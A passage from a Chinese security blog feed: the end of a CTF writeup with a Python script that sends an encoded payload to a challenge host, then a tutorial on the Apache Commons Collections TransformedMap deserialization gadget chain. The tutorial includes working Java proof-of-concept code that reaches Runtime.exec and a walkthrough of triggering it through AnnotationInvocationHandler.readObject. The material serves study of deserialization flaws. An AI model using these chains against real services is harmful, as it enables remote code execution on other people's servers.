class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;%C4%A1&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;%2B&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;%3B&quot;</span>)<br>    payload = payload.replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;%26&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">url</span>):<br>    curl = url + <span class="hljs-string">&quot;curl?q=&quot;</span> + urllib.parse.unquote(getParm(payloadRow))<br>    <span class="hljs-built_in">print</span>(curl)<br>    r = requests.get(curl)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url = <span class="hljs-string">&quot;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/&quot;</span><br>    run(url)<br></code></pre></td></tr></table></figure><img src="/2023/02/03/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912023writeup/pc21.png" class="" title="pc21"><p>orz…</p>]]></content>
    
    
    <categories>
      
      <category>Writeup</category>
      
      <category>java</category>
      
      <category>node.js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TransformedMap攻击链与LazyMap攻击链（cc5）</title>
    <link href="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/"/>
    <url>/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>TransformedMap攻击链是cc1的基础，明白TransformedMap攻击链原理是学明白cc1的关键！</p><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>虚拟机win10+ IntelliJ IDEA+jdk7(一定要)+ Apache Commons Collections » 3.1 的 Jar 包</p><p>maven配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maven">&lt;dependency&gt;<br>    &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>    &lt;version&gt;3.1&lt;/version&gt;<br>&lt;/dependency&gt;<br><br></code></pre></td></tr></table></figure><p>如果下载不成功可以到<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections">maven仓库</a>下载，再导入idea，导入jar包参考这篇<a href="https://blog.csdn.net/Golden_soft/article/details/80952243">文章</a>。</p><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvalObject</span> &#123;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br><br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;mate-calc&quot;</span>&#125;)<br><br>&#125;;<br><br><span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br><br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><span class="hljs-comment">//创建Map并绑定transformerChain</span><br><br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(innerMap, <span class="hljs-literal">null</span>, transformerChain);<br><span class="hljs-comment">//触发漏洞</span><br>Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">onlyElement</span> <span class="hljs-operator">=</span> (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h1><p>1.org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;InvokerTransformer.class</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc1.png" class="" title="pc1"><p>这个类里面的transform是漏洞的根源，我们可以利用transform里面的getClass、getMethod和invoke来执行命令</p><p>对比一下不难看出 , 只要我们能控制 input , this.iMethodName , this.iParamTypes , this.iArgs 四个参数 , 那么就可以通过这组反射调用执行任意代码 !</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc2.png" class="" title="pc2"><p>看到 this.iMethodName , this.iParamTypes , this.iArgs 三个参数都是直接可控的 , 我们可以直接传入参数值 , 而 input 参数是 transform() 函数调用方传入的 , 同样可控 。<br>因此 , 这里的 transform() 方法是完全可以利用的 . 下面构造一个最简单的 POC , 用于弹出计算器 :</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc3.png" class="" title="pc3"><p>虽然可以成功执行命令 , 但是这种攻击方式肯定是没有意义的 , 我们构造代码是为了在远端服务上执行 , 而并非在本地服务器上执行 . 远程服务器上肯定不会出现像 t1.transform(Runtime.getRuntime()); 这样的代码 . 所以我们必须对上述代码做优化 , 减少反序列化后的操作 .优化代码的第一步就是消除transform() 方法的参数限制 : Runtime.getRuntime().</p><p>org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;ChainedTransformer.class由于 Runtime 类并没有继Serializable 接口 , 因此我们无法直接传入实例对象 ,所以 , 消除上述限制的最好方法就是通过 Java 反射机制来构建java.lang.Runtime.getRuntime().exec() 方法调用链 . 由于 Runtime.class 构造函数的特殊性 , 我们在编写 Java 反射代码时至少要调用 getMethod() , getRuntime() , exec() , invoke() 四个方法 . 因此 , 一组反射是完全不够用的 ,我们必须要找到一条链 , 来拼接多组反射 , 从而实现命令执行 .ChainedTransformer.transform() 方法恰好符合这个要求.</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc4.png" class="" title="pc4"><p>ChainedTransformer 类的构造函数返回一个 Transformer[] 类型的数组this.iTransformers . 该类的 transform() 方法会循环获取 this.iTransformers 数组中的每一项 , 调用它的 transform() 方法 , 并将返回结果作为下次循环调用的参数 .所以 , 我们可以编写多个 InvokerTransformer 实例对象 , 分别获取 getRuntime() , invoke() , exec() 方法 , 然后将这些实例对象添加到 this.iTransformers 数组中 , 从而获得一条完整的调用链</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc5.png" class="" title="pc5"><p>先new了一个Transformer的对象（数组类型），然后传参，参数是InvokerTransformer的对象，然后这个对象也要传参，传入下图的参数。这个数组保存了三个InvokerTransformer的对象</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc6.png" class="" title="pc6"><p>此时getRuntime() , invoke() , exec() 方法已经准备好了但是缺一个 java.lang.Runtime 实例对象（就是上面上面三个方法的总和，要有一个对象来开启这条链）。</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc7.png" class="" title="pc7"><p>ConstantTransformer.transform() 方法恰好会返回 Runtime() 实例对象 , 因此我们只需要将 Runtime.class 传入 ConstantTransformer 的构造方法中即可 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc8.png" class="" title="pc8"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test2</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br><br>        &#125;;<br>        Transformer transformerChain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        transformerChain.transform(<span class="hljs-string">&quot;kkkk&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>transform() 方法的利用条件上一步 , 我们通过 java 反射机制消除了 transform() 方法的参数限制 . 但是依旧需要手动触发 transform() 方法 , 这样的场景是比较少的 .<br>况且根据 Java 反序列化漏洞的定义 , 我们更加期望后端程序在执行 readObject() 方法时就会自动执行 transform() 方法.<br>综上所述 , 为了实现完整的利用链 , 必须要达成如下两个目标 :<br>    ①找到一个 tansform() 方法 , 该方法所属的实例对象是可控的.<br>    ②找到一个重写的 readObject() 方法 , 该方法会自动调用 transform() 方法.</p><p>这个限制是非常严谨的 , 目前研究人员共发掘出了两条攻击链 , 也就是经典的 TransformedMap攻击链 和 LazyMap攻击链</p><h1 id="TransformedMap-攻击链"><a href="#TransformedMap-攻击链" class="headerlink" title="TransformedMap 攻击链"></a>TransformedMap 攻击链</h1><p>此类是有用到序列化的接口，可以序列化<br>首先要知道什么是 TransformedMap 类 , 以及这个类是干什么的 . 官方文档关于这个类的定义非常少 , 个人认为下面这种说法是比较通俗易懂的 .<br>Apache Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的一个扩展 .<br>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换 , 具体的变换逻辑由Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入.</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc9.png" class="" title="pc9"><p>TransformedMap.checkSetValue()TransformedMap 类的 checkSetValue() 方法中调用了 Transform() 方法 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc10.png" class="" title="pc10"><p>只要我们能控制 <strong>this.valueTransformer</strong> , 那么就可以利用该方法执行 <strong>ChainedTransformer.transform()</strong> 方法 , 进入构造好的函数调用链 . </p><p>根据上文可以得知 , <strong>this.valueTransformer</strong> 会在 <strong>TransformedMap</strong> 类被实例化时被传入 .由于 <strong>TransformedMap</strong> 类的构造方法通过 <strong>protected</strong> 修饰符修饰 , 所以无法在外界获得 <strong>TransformedMap</strong> 实例对象 . 对此 , 该类提供了 <strong>decorate()</strong> 方法来返回 <strong>TransformedMap</strong> 实例对象 , 而 <strong>decorate()</strong> 方法通过 <strong>public</strong> 修饰符修饰 , 外界可以直接调用 .</p><p>综上所述 , <strong>this.valueTransformer</strong> 是完全可控的 . 我们可以通过这里调用 <strong>ChainedTransformer.transform()</strong> 方法</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc11.png" class="" title="pc11"><p>既然要调用 TransformedMap.decorate() 方法 , 那么这里 ValueTransformer 就应为 ChainedTransformer . 此外 , 我们还需要一个 Map类型的变量 , 而获取 Map 最简单的方式就是构造一个 HashMap , 然后将该 Map 实例对象传入 decorate() 方法中.（我认为这个innerMap没用的就是凑个数，还有上面提到的ChainedTransformer他的实例化对象是transformerChain所以第三个参数是这个）</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc12.png" class="" title="pc12"><p>AbstractInputCheckedMapDecorator$MapEntry.setValue()transformedMap 的父类 AbstractInputCheckedMapDecorator 中存在一个静态内部类 MapEntry , 该类 setValue() 中调用了 checkSetValue() 方法.（这一步我认为就是要找到调用前面checkSetValue()）</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc13.png" class="" title="pc13"><p>我们现在的目标是调用 TransformedMap.checkSetValue() 方法 , 因此只需要令 this.parent 指向 TransformedMap 实例对象即可 . 查看 MapEntry 内部类的构造函数 , 可以确定 this.parent 参数值是作为参数传入的 . 是可控的 .</p><p>AbstractInputCheckedMapDecorator$EntrySetIterator.next()我们对 this.parent &#x3D; parent 打断点 , 查看 parent 参数值的函数调用栈</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc14.png" class="" title="pc14"><p>可以看到 , AbstractInputCheckedMapDecorator 类的静态内部类 EntrySetIterator 中的 next() 方法触发了 MapEntry 内部类的构造函数 , 并传入 parent 参数值 . 最后返AbstractInputCheckedMapDecorator$MapEntry 实例对象 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc15.png" class="" title="pc15"><p>AbstractInputCheckedMapDecorator$EntrySet.iterator()这里 this.parent 参数依旧是可控的 ,我们继续跟踪 this.parent &#x3D; parent ,</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc16.png" class="" title="pc16"><p>可以看到 , AbstractInputCheckedMapDecorator 类的静态内部类 EntrySet 中的 iterator() 方法触发了 EntrySetIterator 内部类的构造函数 , 并且传入 parent 参数. 最后返回 AbstractInputCheckedMapDecorator$EntrySetIterator 实例对象.<br>AbstractInputCheckedMapDecorator.entrySet()依旧没看到 this.parent 的控制点 , 我们继续追踪 this.parent &#x3D; parent .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc17.png" class="" title="pc17"><p>这里会根据 isSetValueChecking() 方法的返回值决定是否调用 AbstractInputCheckedMapDecorator.EntrySet() 方法 .<br>而抽象类 AbstractInputCheckedMapDecorator 恰好是 TransformedMap 的父类 , 因此这里我们可以直接将 this 指向 TransformedMap . 使得最后调用 TransformedMap.checkSetValue() 方法 .<br>TransformedMap.isSetValueChecking()<br>那么现在还剩最后一个问题 : 我们需要让 isSetValueChecking() 方法的返回值为 True<br>TransformedMap 实现了抽象父类的 isSetValueChecking() 方法 , 来看一下函数定义</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc18.png" class="" title="pc18"><p>只需要让 this.valueTransformer 不会空即可 ! 这当然是成立的 , 我们在将 TransfromedMap.decorate() 方法时已经将 ChainedTransformer 赋值给了 this.valueTransformer</p><p>entrySet-&gt;iterator-&gt; MapEntry-&gt;next()获得一个MapEntry对象并不是控制parent</p><p>本地命令执行 &#x3D;&gt; POC现在你会惊奇的发现 , 我们上面所有提到的方法调用构成了一个闭环 , 我们只需要获取 AbstractInputCheckedMapDecorator$MapEntry 实例对象并手动触发 setValue() 方法 , 就可以执行任意代码 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc19.png" class="" title="pc19"><p>获取了MapEntry对象就可以调用了setValue方法，然后就可以调用checkSetValue</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc20.png" class="" title="pc20"><p>而outerMap是TransformedMap的对象,onlyElement是outerMap是调用函数返回的MapEntry对象，我认为 this.parent 已经指向TransformedMap 实例对象。<br>延长攻击链 &#x3D;&gt; annotation&#x2F;AnnotationInvocationHandler.readObject()为什么本文分析前提到这个 POC 是不完善的呢 ? 因为这个 POC 压根没法投入使用 ! 我们最终的目标是让上文构造的恶意类在远程服务器上执行 , 也就是让恶意类经过序列化&#x2F;反序列化后直接执行 .<br>我们的目标是找到一个重写 readObject() 方法的地方 . 该方法中会调用可控的 setValue() 方法 . 那么是否存在这样的地方呢 ? 在 Jdk1.7 中 , annotation&#x2F;AnnotationInvocationHandler 类的 readObject() 方法实现了我们的需求 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc21.png" class="" title="pc21"><p>第一步<br>要想调用 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 第一步要达成如下三个条件 .<br>var5 &#x3D; AbstractInputCheckedMapDecorator$MapEntry<br>!var7.isInstance(var8)<br>!(var8 instanceof ExceptionProxy) &#x3D;&#x3D; True<br>var7 的值通过 var3.get(var6) 返回 , 且不能为空 .<br>var6 和 var8 的值比较好看 , 分别通过 var5.getKey() 方法和 var5.getValue() 方法获取 var5 的键名与值.<br>var5 是 var4.next() 方法返回的 , 根据上文的内容 , 我们希望 var4 为 AbstractInputCheckedMapDecorator$EntrySetIterator实例对象.<br>第二步<br>从第一步的结果来看 , 我们需要知道 var3 和 var4 的赋值过程 .<br>Iterator var4 &#x3D; this.memberValues.entrySet().iterator()<br>Map var3 &#x3D; var2.memberTypes();<br>var4 是 this.memberValues.entrySet().Iterator() 方法返回的 , 对比前面的 POC , 我们期望 this.memberValues 指向 TransformedMap .<br>var3 是 var2.memberTypes() 方法返回的 , 我们跟踪该方法 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc22.png" class="" title="pc22"><p>通过几步跳转 , 可以确定这里 var3 是一个 HashMap , 因此上文 var3.get() 就是调用 HashMap.get() 方法.<br>第三步<br>现在需要关注 this.memberValues 与 var2 的值了 . 其中 var2 的赋值如下 :</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc23.png" class="" title="pc23"><p>为了确定 this.type 和 this.memberValues 的值 , 我们来看一下当前类构造函数的定义 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc24.png" class="" title="pc24"><p>AnnotationInvocationHandler 的构造函数第二个参数类型为 Map , 这点非常巧 , 我们可以直接传入 TransformedMap 实例对象.</p><p>关于 var1 , 我们目前只知道它是个注解类 . 网上很多分析文章中都使用了 java.lang.annotation.Retention 这个注解类 . 笔者能力有限 , 就不去找其他的了 , 来看一看这个注解类是否满足下面各种 if 条件吧 !注意 : 这里 var1 , var2 是构造函数的形式参数 , 并非 readObject() 方法中的 var1 和 var2.<br>第四步<br>这里 var1 , var2 是 readObject() 方法中的形式参数.<br>构造函数 AnnotationInvocationHandler.AnnotationInvocationHandler()</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc25.png" class="" title="pc25"><p>这里 this.type 被赋值为 java.lang.annotation.Retention<br>var2 &#x3D; AnnotationType.getInstance(this.type)</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc26.png" class="" title="pc26"><p>经过这步赋值 , var2 实例对象中的 memberTypes 参数变为一个 HashMap , 其中存在键值对 : {“value” : “java.lang.annotation.RetentionPolicy”}<br>3.Class var7 &#x3D; (Class)var3.get(var6)</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc27.png" class="" title="pc27"><p>这里调用了 var3.get(var6) , 并将结果赋值给变量 var7 , var3 是一个 HashMap , var6 值为 “value” , 所以实际执行的是 HashMap.get(“value”) . 而 var3 中恰好存在名为 “value” 的键名 , 因此可以把 “value” 的值 “java.lang.annotation.RetentionPolicy” , 赋值给变量 var7.</p><p>这样变量 var7 就不为空了 , 自然通过了下文 if (var7 !&#x3D; null) 的条件判断 .<br>综上所述 , 由于变量 var6 的值为 value , 因此变量 var7 可以获取到值并通过下面的条件判断 . 而 var6 的值又是通过 var5.getKey() 获取的 , 而 var5 就是我们代码中创建的 HashMap</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc28.png" class="" title="pc28"><p>因此这里也引出了该 POC 利用成功的一个核心要求 : 手工创建的 HashMap 的键名必须为 Value .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc29.png" class="" title="pc29"><p>相反 , 如果这里 HashMap 的键名被赋予其他值( 例如 “k4d0n” ) , 那么此处将执行 HashMap.get(“k4d0n”) , 哈希表中不存在这个键名 , 因此 var7 会被赋值 null , 不会通过下面的 if 条件判断 .<br>第五步<br>后面就没啥好说的, 程序将执行到 var5.setValue() , 即执行 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 进入恶意函数调用链 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc30.png" class="" title="pc30"><p>至此 , 当我们构造的恶意类在远程服务器通过 readObject() 方法进行反序列化时 , 会自动调用 AbstractInputCheckedMapDecorator$MapEntry.setValue() 方法 , 进入我们构造好的恶意函数调用链 , 最终执行任意代码 .<br>反序列化命令执行 &#x3D;&gt; POC<br>现在可以构造完整的 POC 了 . 我们仅需要获取 AnnotationInvocationHandler 实例对象 , 并向构造函数中传入Retention类 与 TransformedMap实例对象 , 即可实现POP攻击链自动调用 .<br>需要注意的是 , AnnotationInvocationHandler类的构造函数使用了默认修饰符 , 通过默认修饰符修饰的方法只能同包访问 , 因此这里无法直接访问 .</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc31.png" class="" title="pc31"><p>这里与获取 java.lang.Runtime 实例对象的思路类似 , 即通过反射来获取类 , 通过 getDeclaredConstructor()方法获取构造器 , 通过 setAccessible() 方法来开放构造器访问权限.</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc32.png" class="" title="pc32"><p>最后写一个本地 Demo , 将当前类序列化后反序列化 , 即可得到完整的 POC.</p><img src="/2023/02/03/TransformedMap%E9%93%BE%E4%B8%8ELazyMap%E9%93%BE/pc33.png" class="" title="pc33"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.iterators.ObjectArrayIterator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test3</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] 